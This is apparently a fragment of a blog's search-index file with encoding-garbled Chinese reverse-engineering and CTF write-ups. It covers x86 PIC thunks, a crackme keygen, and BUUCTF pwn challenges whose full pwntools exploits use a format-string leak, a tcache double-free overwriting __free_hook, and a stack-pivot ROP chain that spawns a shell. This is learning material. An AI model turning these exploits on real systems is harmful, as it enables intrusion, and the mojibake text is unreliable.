class="built_in">eax</span>,<span class="number">0x2e20</span>                                                                          </span><br><span class="line">â”‚   <span class="number">0x11c1</span> &lt;main+<span class="number">20</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="number">0x17</span>                                                            </span><br><span class="line">â”‚   <span class="number">0x11c8</span> &lt;main+<span class="number">27</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x7</span>],<span class="number">0x62</span>                                                             </span><br><span class="line">â”‚   <span class="number">0x11cc</span> &lt;main+<span class="number">31</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x6</span>],<span class="number">0xc</span>                                                             </span><br><span class="line">â”‚   <span class="number">0x11d2</span> &lt;main+<span class="number">37</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span> </span><br><span class="line">â”‚   <span class="number">0x11d7</span> &lt;main+<span class="number">42</span>&gt;                        <span class="keyword">leave</span>                                                                                      </span><br><span class="line">â”‚   <span class="number">0x11d8</span> &lt;main+<span class="number">43</span>&gt;                        <span class="keyword">ret</span>                           </span><br></pre></td></tr></table></figure><p>åœ¨main+10çš„ä½ç½®å¤„è°ƒç”¨äº†ä¸€ä¸ª__x86.get_pc_thunk.axï¼Œå¾ˆå¥½å¥‡è¿™ä¸ªæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼ŒgdbåŠ¨æ€è°ƒè¯•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://i.loli.net/2021/04/06/OD2N7xLbXAhJ5sS.png" style="zoom:50%;" /></p><p>å‘ç°äº†åªæœ‰ä¸¤æ¡æ±‡ç¼–æŒ‡ä»¤</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">esp</span>]</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>espå­˜çš„å°±æ˜¯mainå‡½æ•°çš„åœ°å€ï¼ˆå› ä¸ºåœ¨mainå‡½æ•°ä¸­calläº†å½“å‰è¿™ä¸ªå‡½æ•°ï¼‰</p><p>ç®€å•è¯´è¿™ä¸ªæŒ‡ä»¤å°±ç›¸å½“äº<code>mov eax,eip</code></p><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯getåˆ°mainå‡½æ•°çš„åœ°å€</p><p>å¾ˆå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆè¦è·å¾—mainå‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°</p><p><img src="https://i.loli.net/2021/04/06/2UemXT6PY31hN4B.png" alt="" style="zoom:50%;" /></p><p>å‘ç°eaxè¿™é‡Œé€šè¿‡addä¸€ä¸ªæ•°å­—åå˜æˆäº†GOTè¡¨çš„åœ°å€ï¼Œè¿™æ ·å°±ä¸éš¾ç†è§£äº†ï¼ˆå…³äºä»€ä¹ˆæ˜¯GOTè¡¨å’ŒPLTè¡¨ï¼Œæˆ‘ä¼šåé¢å†å±•å¼€æ–‡ç« è¿›è¡Œå­¦ä¹ è®°å½•ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°åœ¨x86ä¸Šçš„PICï¼ˆposition independent codeï¼‰ä¸­ä½¿ç”¨ï¼Œç”¨æ¥å®ç°å¯¹æ¨¡å—çš„å†…éƒ¨æ•°æ®è¿›è¡Œè®¿é—®ï¼Œæ¯”å¦‚å…¨å±€å˜é‡ã€‚æˆ‘ä»¬åœ¨mainå‡½æ•°ä¸­è®¿é—®ä¸€ä¸‹å…¨å±€å˜é‡xï¼Œç”¨gdbæŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œæœç„¶å¯ä»¥çœ‹åˆ°ç¨‹åºè®¿é—®xæ˜¯é€šè¿‡GOTè¿›è¡Œçš„ã€‚</p><p><img src="https://i.loli.net/2021/04/06/1QBToDwrjivpK52.png" style="zoom:50%;" /></p><blockquote><p>äº‹å®ä¸Šç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰ï¼š<code>__x86.get_pc_thunk.bx</code>ï¼Œ<code>__x86.get_pc_thunk.cx</code>ï¼Œ <code>__x86.get_pc_thunk.dx</code>ã€‚åŠŸèƒ½æ˜¯ç±»ä¼¼çš„ï¼Œåªä¸è¿‡ä¼ å…¥çš„å¯„å­˜å™¨åˆ†åˆ«ä¸º<code>%ebx</code>ï¼Œ <code>%ecx</code>ï¼Œ <code>%edx</code>ã€‚æ—©æœŸç‰ˆæœ¬çš„ç¼–è¯‘å™¨ä¸­ï¼Œè¿™ä¸ªå‡½æ•°å«<code>__i686.get_pc_thunk.ax</code>ã€‚</p></blockquote><h2 id="å…³é—­pie"><a href="#å…³é—­pie" class="headerlink" title="å…³é—­pie"></a>å…³é—­pie</h2><p>ä½¿ç”¨gccç¼–è¯‘å‘½ä»¤</p><p><code>gcc -fno-pie</code></p><p>å…³é—­pieï¼Œè°ƒè¯•ç¨‹åºå‘ç°å·²ç»ä¸éœ€è¦å†é€šè¿‡è¯¥å‡½æ•°è¿›è¡Œå¯»å€äº†</p><p><img src="https://i.loli.net/2021/04/06/JO6fZ7A2sMKHxzk.png" style="zoom:50%;" /></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://stackoverflow.com/questions/50105581/how-do-i-get-rid-of-call-x86-get-pc-thunk-ax">c - How do i get rid of call    __x86.get_pc_thunk.ax - Stack Overflow</a></p><p><a href="https://qphikk.cn/archives/84">__x86.get_pc_thunk.axå‡½æ•°</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme</title>
      <link href="2021/03/23/crackme1/"/>
      <url>2021/03/23/crackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="Peachâ€™s-Crackme"><a href="#Peachâ€™s-Crackme" class="headerlink" title="Peachâ€™s Crackme"></a>Peachâ€™s Crackme</h2><p><img src="https://i.loli.net/2021/03/23/7OH8pcVqwFJzQdS.png" alt="1.png"><br>ç¨‹åºç®€ä»‹ï¼Œä¸€ä¸ªç®€å•çš„æ³¨å†ŒåŠŸèƒ½<br><img src="https://i.loli.net/2021/03/23/txOWv6PMi8fRLHA.png" alt="3.png"></p><p>é¦–å…ˆx64dbgåˆ†æä¸€ä¸‹ï¼Œæ ¹æ®ç¨‹åºåŠŸèƒ½æ‰¾æ‰¾å­—ç¬¦ä¸²å•¥çš„<br><img src="https://i.loli.net/2021/03/23/nSVNcGjRhlZF7kK.png" alt="4.png"><br>IDAé™æ€åˆ†æï¼Œæ¥å®šä½ä¸€ä¸‹åœ°å€å•¥çš„ï¼Œç„¶åf5å¤§æ³•ç›´æ¥è¯»ä¼ªä»£ç <br><img src="https://i.loli.net/2021/03/23/DZecAmIPGyu4Ftg.png" alt="5.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_4081C0(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">v5 = sub_401A94(String);</span><br><span class="line"><span class="keyword">if</span> ( v5 == atoi(v7) )</span><br><span class="line">    MessageBoxW(a1, <span class="string">L&quot;You are such a gud boi! Lemme pat you!&quot;</span>, <span class="string">L&quot;Good boi!&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå®šä½åˆ°è¿™ä¸ªåœ°æ–¹<br>ä¸»è¦åˆ†æä¸€ä¸‹v5å’Œv7éƒ½æ˜¯å•¥ï¼Œé€šè¿‡idaçš„ä¸‡èƒ½xå¼•ç”¨å¤§æ³•ï¼Œè¿½è¸ªåˆ°ä¸€ä¸ªwin32å‡½æ•°ï¼ŒæŸ¥æ‰‹å†ŒæŠŠåŠŸèƒ½å’Œå‚æ•°ç»™ææ¸…æ¥šå°±okäº†<br><img src="https://i.loli.net/2021/03/23/q9bHQUNZxaL6gSc.png" alt="2.png"></p><p>æœ€ç»ˆå‘ç°v5æ˜¯æ³¨å†Œæ—¶çš„åå­—ï¼Œv7æ˜¯æˆ‘ä»¬è¾“å…¥çš„åºåˆ—å·ï¼ŒäºŒè€…ä¹‹é—´é€šè¿‡ä¸€ä¸ªå‡½æ•°æ¥å¤„ç†ï¼Œæœ¬åœ°è¿è¡Œä¸€ä¸‹å‡½æ•°å°±è¡Œäº†ï¼Œç›´æ¥å‡ºåºåˆ—å·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> a1[] = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    v3 += a1[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="number">431136</span> * v3 - <span class="number">3000</span>) / <span class="number">2</span> - *a1));</span><br><span class="line">&#125;          </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/WFdr8CReqc2Qliu.png" alt="6.png"></p><h2 id="WarGames"><a href="#WarGames" class="headerlink" title="WarGames"></a>WarGames</h2><ul><li>level : 2</li><li>Platform : Unix/linux etc.</li><li>Description : Use ./WarGames pass</li></ul><p>å¤ªç®€å•äº†ï¼ŒæŠŠä»–çš„ç®—æ³•è·‘ä¸€éå°±æŠŠç»“æœå‡ºæ¥äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> crackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwnç³»åˆ—1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸‹buuctf pwnçš„write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘å°±æ˜¯ä¹‹å‰æŠŠflagæ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œç„¶åè¾“å…¥å­—ç¬¦ä¸²å’Œflagå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”<br>ä¸»å‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æ ˆä¸Šæ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°çš„ä½ç½®ï¼Œç„¶åç›´æ¥è¯»å‡ºæ¥å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>è€ƒç‚¹<ol><li>ç¨‹åºè°ƒè¯•ï¼Œæ ˆæº¢å‡ºæ³„æ¼åœ°å€</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>ç¨‹åºå…ˆç»™äº†ä¸€ä¸ªè¾“å…¥nameå’Œidçš„ä¸œè¥¿ï¼Œå‘ç°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ä½†æ˜¯ç”±äºæ˜¯__printf_chkï¼Œæ‰€ä»¥æ²¡æ‰¾åˆ°å¥½çš„åˆ©ç”¨ç‚¹<br>ç„¶åä¸‹é¢æ˜¯è¾“å…¥idï¼Œè¿˜æœ‰ä¸ªputsï¼Œè°ƒè¯•å‘ç°idåé¢æ˜¯æœ‰libcå‡½æ•°setbufferçš„ï¼Œåˆå› ä¸ºæ˜¯putså‡½æ•°ç›´æ¥æ¥ç»™ä»–æ³„æ¼å‡ºæ¥<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>addåŠŸèƒ½åªå…è®¸ç”³è¯·0-0x50å¤§å°çš„chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>deleteåŠŸèƒ½å­˜åœ¨UAF<br>åœ¨è€ç‰ˆçš„libc-2.27ä¸‹æ˜¯å…è®¸double freeå­˜åœ¨çš„<br>ç„¶åç›´æ¥æ”¹__free_hookä¸ºsystemä¸€æŠŠæ¢­å°±è¡Œäº†<br>æ–°ç‰ˆçš„æ‰“å®Œä»Šå¤©çš„VNå†è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actfæ ˆè¿ç§»</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ç»™å‡ºexpå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="åˆ†æå›é¡¾æ ˆè¿ç§»"><a href="#åˆ†æå›é¡¾æ ˆè¿ç§»" class="headerlink" title="åˆ†æå›é¡¾æ ˆè¿ç§»"></a>åˆ†æå›é¡¾æ ˆè¿ç§»</h2><p>æ²¡æœ‰å¼€PIEä¿æŠ¤å’ŒCanary</p><ul><li>IDAåˆ†æç»“æœå¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>é¢˜ç›®ç»™å‡ºæ ˆåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆè¿ç§»åˆ°æ ˆä¸Šï¼Œå¸ƒç½®gadgetæ³„æ¼libcåœ°å€ç„¶åone_gadgetä¸€æŠŠæ¢­</p><ul><li>æ ˆå¸§ç»“æ„å¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆè¿ç§» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒè¿›åˆ¶ç¨‹åºä»æºæ–‡ä»¶åˆ°å¯æ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
